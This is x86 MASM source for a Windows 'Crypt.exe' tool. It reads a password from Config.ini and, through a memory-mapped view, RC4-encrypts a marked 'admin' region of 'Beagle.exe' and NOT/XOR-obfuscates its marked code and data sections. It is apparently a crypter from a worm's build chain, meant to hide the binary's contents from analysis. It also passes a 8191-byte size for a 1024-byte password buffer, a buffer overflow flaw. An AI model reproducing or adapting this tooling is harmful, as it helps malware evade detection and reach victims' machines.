; #########################################################################

        .386
        .model flat, stdcall
        option casemap :none   ; case sensitive

; #########################################################################

    .nolist
        include kernel32.inc
        include windows.inc
        include shlwapi.inc
        include user32.inc

        .list
        includelib kernel32.lib
        includelib user32.lib
        includelib shlwapi.lib
        includelib user32.lib

; #########################################################################

.data
    szBeagle    db  "Beagle.exe",0

.code

ZeroMemory proc uses edi lpMem, Len: DWORD
        cld
        mov     edi, lpMem
        mov     ecx, Len
        shr     ecx, 2
        xor     eax, eax
        rep stosd
        mov     ecx, Len
        and     ecx, 3
        rep stosb
        ret
ZeroMemory endp

rc4_state struct
    x   BYTE   ?
    y   BYTE   ?
    m   BYTE   256 dup(?)
rc4_state ends

; Reset RC4 state, initialize encryption key
RC4Setup proc uses esi edi ebx state, key, len: DWORD
        LOCAL   a: BYTE
        LOCAL   j: BYTE

        invoke  ZeroMemory, state, sizeof rc4_state
        mov     edi, state
        inc     edi
        inc     edi             ; m
        
        xor     edx, edx
        mov     ecx, 256
@l:
        mov     byte ptr[edi+edx], dl
        inc     dl
        loop    @l

        mov     edi, state
        inc     edi
        inc     edi             ; m
        mov     esi, key

        mov     j, 0
        xor     ecx, ecx        ; k
        xor     ebx, ebx        ; i

@l_gen:
        mov     al, byte ptr[edi+ebx]
        mov     a, al

        add     j, al
        mov     al, byte ptr[esi+ecx]
        add     j, al

        movzx   edx, j
        mov     al, byte ptr[edi+edx]
        mov     byte ptr[edi+ebx], al
        mov     al, a
        mov     byte ptr[edi+edx], al

        inc     ecx
        .IF     ecx >= len
                xor     ecx, ecx
        .ENDIF
        inc     bl
        jnz     @l_gen
        ret
RC4Setup endp

; Crypt data using RC4 algorithm & update the state
RC4Crypt proc uses ebx esi edi state, cdata, len: DWORD
        LOCAL   a: BYTE
        LOCAL   b: BYTE
        LOCAL   x: BYTE
        LOCAL   y: BYTE
        LOCAL   i: DWORD

        mov     ebx, state
        assume  ebx: ptr rc4_state
        mov     al, [ebx].x
        mov     x, al
        mov     al, [ebx].y
        mov     y, al
        mov     edi, ebx
        inc     edi
        inc     edi

        mov     esi, cdata

        mov     i, 0

        mov     ecx, len
        jecxz   @no_data

@l:
        ; x = (unsigned char) ( x + 1 ); a = m[x];
        inc     x
        movzx   eax, x
        movzx   edx, byte ptr[edi+eax]   ; a
        mov     a, dl

        ; y = (unsigned char) ( y + a );
        add     y, dl

        ; m[x] = b = m[y];
        movzx   eax, y
        mov     dl, byte ptr[edi+eax]
        mov     b, dl
        movzx   eax, x
        mov     byte ptr[edi+eax], dl

        ; m[y] = a;
        movzx   eax, y
        mov     dl, a
        mov     byte ptr[edi+eax], dl

        ; data[i] ^= m[(unsigned char) ( a + b )];
        mov     dl, a
        add     dl, b
        mov     dl, byte ptr[edi+edx]
        mov     eax, i
        xor     byte ptr[esi+eax], dl

        inc     i
        loop    @l

@no_data:
        mov     al, x
        mov     byte ptr[ebx], al
        mov     al, y
        mov     byte ptr[ebx+1], al
        ret
RC4Crypt endp

.data
        szConfIniName   db  "\Config.ini",0
        szPassKey       db  "Password",0
        szMainSecton    db  "MainSettings",0
        szOpenError     db  "Crypt.exe: Can't open %s file",0
        szIniError      db  "Crypt.exe: Can't find ini file",0
        szTrimC         db  '" ', 0
        szNULL          db  0

.data?
        rc4s            rc4_state <>
        szConfIniFile   db      2048 dup(?)
        szPassword      db      1024 dup(?)

.code

Write proc uses ebx lpszText: DWORD
        LOCAL   dwWritten: DWORD
        invoke  GetStdHandle, STD_OUTPUT_HANDLE
        mov     ebx, eax
        invoke  lstrlen, lpszText
        mov     edx, eax
        invoke  WriteFile, ebx, lpszText, edx, addr dwWritten, NULL
        ret
Write endp

WriteLn proc lpszText: DWORD
        LOCAL   ln: DWORD
        invoke  Write, lpszText
        mov     ln, 0D0Ah
        invoke  Write, addr ln
        ret
WriteLn endp

ProcessFile proc uses ebx esi edi lpszFileName: DWORD
        LOCAL   hFile, dwFileSize: DWORD

        invoke  CreateFile, lpszFileName, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @file_open_error
        
        invoke  GetFileSize, hFile, 0
        mov     dwFileSize, eax
        inc     eax
        jz      @file_open_close

        invoke  CreateFileMapping, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
        .IF     eax
                mov     ebx, eax
                invoke  MapViewOfFile, eax, FILE_MAP_ALL_ACCESS, 0, 0, 0
                .IF     eax
                        push    eax

                        ; Crypt admin
                        .WHILE  (word ptr[eax] != '++') || (word ptr[eax+2] != '++')
                            inc eax
                        .ENDW
                        mov     esi, eax
                        mov     edi, esi

                        .WHILE  TRUE
                            invoke  RC4Crypt, offset rc4s, esi, 1
                            inc     esi
                            .IF (word ptr[esi] == '++') && (word ptr[esi+2] == '++')
                                .BREAK
                .ENDIF
            .ENDW
                        mov     dword ptr[esi], 0

                        ; Encrypt code
                        mov     eax, [esp]
                        .WHILE  (word ptr[eax] != '$$') || (word ptr[eax+2] != '$$')
                            inc eax
                        .ENDW
                        mov     dword ptr[eax], 0

                        mov     esi, eax
                        inc esi
                        mov     edi, esi
                        .WHILE  (word ptr[esi] != '$$') || (word ptr[esi+2] != '$$')
                            lodsb
                            not     al
                            xor     al, 5
                            stosb
                        .ENDW
                        xor     eax, eax
                        stosd

                        ; Encrypt data
                        mov     eax, [esp]
                        .WHILE  (word ptr[eax] != '$$') || (word ptr[eax+2] != '$$')
                            inc eax
                        .ENDW
                        mov     dword ptr[eax], 0

                        mov     esi, eax
                        inc esi
                        mov     edi, esi
                        .WHILE  (word ptr[esi] != '$$') || (word ptr[esi+2] != '$$')
                            lodsb
                            not     al
                            xor     al, 5
                            stosb
                        .ENDW
                        xor     eax, eax
                        stosd
                .ENDIF
                invoke  CloseHandle, ebx
        .ENDIF

@file_open_close:
        invoke  CloseHandle, hFile

@file_open_error:
        ret
ProcessFile endp

start:
        ; Expand Config.ini path
        invoke  GetCurrentDirectory, 2047, offset szConfIniFile
        invoke  lstrcat, offset szConfIniFile, offset szConfIniName

        ; Get password from ini file
        invoke  GetPrivateProfileString, offset szMainSecton, offset szPassKey, offset szNULL, offset szPassword, 8191, offset szConfIniFile
        .IF     !eax
                invoke  WriteLn, offset szIniError
                invoke  ExitProcess, 0
        .ENDIF

        invoke  lstrlen, offset szPassword
        invoke  RC4Setup, offset rc4s, offset szPassword, eax

    invoke  ProcessFile, offset szBeagle

        invoke  ExitProcess, 0
end start
